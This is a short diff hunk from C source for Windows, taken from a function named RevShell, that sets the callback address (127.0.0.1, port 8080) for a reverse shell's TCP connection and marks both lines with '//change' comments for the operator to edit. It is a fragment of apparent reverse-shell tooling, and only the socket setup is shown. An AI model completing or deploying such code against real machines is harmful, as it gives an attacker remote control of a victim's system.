@@ -101,8 +101,8 @@ void RevShell() {
     sockaddr_in addr;
     PVOID paddbuf = NULL;
     addr.sin_family = AF_INET;
-    addr.sin_addr.S_un.S_addr = inet_addr("127.0.0.1");
-    addr.sin_port = htons(8080);
+    addr.sin_addr.S_un.S_addr = inet_addr("127.0.0.1"); //change
+    addr.sin_port = htons(8080);                        //change
 
     if (connect(tcpsock, (SOCKADDR*)&addr, sizeof(addr)) == SOCKET_ERROR) {
         closesocket(tcpsock);
